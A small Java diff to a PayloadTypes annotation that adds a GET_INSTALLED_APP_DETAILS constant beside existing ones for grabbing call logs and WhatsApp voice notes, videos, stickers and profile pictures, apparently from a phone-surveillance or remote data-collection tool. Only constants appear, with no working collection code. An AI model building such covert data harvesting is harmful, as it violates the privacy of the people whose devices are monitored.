@@ -25,7 +25,8 @@ import java.lang.annotation.RetentionPolicy;
         PayloadTypes.GET_WHATSAPP_PROFILE_PICS,
         PayloadTypes.GET_WHATSAPP_STICKERS,
         PayloadTypes.GET_WHATSAPP_VIDEOS,
-        PayloadTypes.GET_WHATSAPP_VOICE_NOTES})
+        PayloadTypes.GET_WHATSAPP_VOICE_NOTES,
+        PayloadTypes.GET_INSTALLED_APP_DETAILS})
 
 public @interface PayloadTypes {
     int GET_CALL_LOGS = 0;
@@ -49,4 +50,6 @@ public @interface PayloadTypes {
     int GET_WHATSAPP_STICKERS = 17;
     int GET_WHATSAPP_VIDEOS = 18;
     int GET_WHATSAPP_VOICE_NOTES = 19;
+
+    int GET_INSTALLED_APP_DETAILS = 20;
 }
